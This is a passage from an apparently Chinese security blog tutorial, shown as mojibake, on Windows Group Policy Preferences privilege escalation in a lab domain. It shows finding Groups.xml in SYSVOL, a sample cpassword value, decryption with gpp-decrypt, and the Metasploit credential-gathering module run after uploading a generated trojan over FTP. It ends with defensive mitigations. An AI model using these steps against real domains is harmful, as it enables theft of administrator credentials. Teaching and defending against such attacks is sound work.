<p>æŸ¥çœ‹ç»„ç­–ç•¥å¯¹è±¡<code>test</code>çš„è¯¦ç»†ä¿¡æ¯ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084718.png" alt="image-20210116125821832"></p>
<p>è‡³æ­¤ï¼Œç»„ç­–ç•¥é…ç½®å®Œæˆï¼ŒåŸŸå†…ä¸»æœºé‡æ–°ç™»å½•ã€‚</p>
<blockquote>
<p>  ç®¡ç†å‘˜åœ¨åŸŸä¸­æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥åï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨SYSVOå…±äº«ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªXMLæ–‡ä»¶ï¼Œå³<code>Groups.xml</code>,è¯¥æ–‡ä»¶ä¸­ä¿å­˜äº†è¯¥ç»„ç­–ç•¥æ›´æ–°åçš„å¯†ç ã€‚</p>
</blockquote>
<p>æ ¹æ®testçš„ID å»è®¿é—® <code>\\test.yhy\SYSVOL\test.yhy\Policies</code> æˆ–è€…æœ¬åœ°çš„<code>C:\Windows\SYSVOL\domain\Policies</code>ç›¸å¯¹åº”çš„ç­–ç•¥ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084723.png" alt="image-20210116130016932"></p>
<p>æ‰“å¼€ï¼Œè®¿é—®<code>\Machine\Preferences\Groups</code>ï¼Œæ‰¾åˆ°æ–‡ä»¶<code>Groups.xml</code>ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084729.png" alt="image-20210116130711551"></p>
<p>å…¶ä¸­çš„å…³æ³¨ç‚¹ä¸º<code>cpassword</code>: fjomcrwPmyEFuKDFM1WGGDUe8Ap1iGL&#x2F;RsEuyDABYBI</p>
<h4 id="3-2-2-æ¼æ´åˆ©ç”¨"><a href="#3-2-2-æ¼æ´åˆ©ç”¨" class="headerlink" title="3.2.2 æ¼æ´åˆ©ç”¨"></a>3.2.2 æ¼æ´åˆ©ç”¨</h4><p>ä»‹ç»ä¸¤ç§ç®€å•çš„åˆ©ç”¨æ–¹å¼</p>
<ul>
<li>Kali ä¸‹ï¼Œå°†cpassword å­—æ®µå¤åˆ¶åˆ°kaliä¸­ï¼Œä½¿ç”¨gpp-decrypt è¿›è¡Œç ´è§£</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084757.png" alt="img"></p>
<ul>
<li><p>msf æ¨¡å—</p>
<p>ä½¿ç”¨msfåæ¸—é€æ¨¡å—</p>
<p><code>run post/windows/gather/credentials/gpp</code></p>
<p>å½“æ‹¿åˆ°ç›®æ ‡çš„sessionåï¼ˆè¿™é‡Œç›´æ¥å°†msfç”Ÿæˆçš„é©¬ï¼Œé€šè¿‡ftpä¸Šä¼ ï¼Œå¹¶æ‰§è¡Œï¼‰</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084804.png" alt="image-20210116134115737"></p>
<h2 id="4-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡æªæ–½"><a href="#4-ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡æªæ–½" class="headerlink" title="4. ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡æªæ–½"></a>4. ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒçš„é˜²å¾¡æªæ–½</h2><p>åœ¨ç”¨äºç®¡ç†ç»„ç­–ç•¥çš„è®¡ç®—æœºä¸Šå®‰è£… KB2962486è¡¥ä¸ï¼Œé˜²æ­¢æ–°çš„å‡­æ®è¢«æ”¾ç½®åœ¨ç»„ç­–ç•¥é¦–é€‰é¡¹ä¸­ã€‚å¾®è½¯åœ¨2014å¹´ä¿®å¤äº†ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒæ¼æ´ï¼Œä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯ä¸å†å°†å¯†ç ä¿å­˜åœ¨ç»„ç­–ç•¥é¦–é€‰é¡¹ä¸­ã€‚</p>
<p>æ­¤å¤–ï¼Œé’ˆå¯¹Everyoneè®¿é—®æƒé™è¿›è¡Œè®¾ç½®ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<ol>
<li>è®¾ç½®å…±äº«æ–‡ä»¶å¤¹SYSVOLçš„è®¿é—®æƒé™</li>
<li>å°†åŒ…å«ç»„ç­–ç•¥å¯†ç çš„ XML æ–‡ä»¶ä» SYSVOL ç›®å½•ä¸­åˆ é™¤s</li>
<li>ä¸è¦æŠŠå¯†ç æ”¾åœ¨æ‰€æœ‰åŸŸç”¨æˆ·éƒ½æœ‰æƒè®¿é—®çš„æ–‡ä»¶ä¸­ </li>
<li>å¦‚æœéœ€è¦æ›´æ”¹åŸŸä¸­æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œå»ºè®®ä½¿ç”¨LAPS</li>
</ol>
]]></content>
      <categories>
        <category>åŸŸæ¸—é€</category>
      </categories>
      <tags>
        <tag>Windowsææƒ</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
</search>
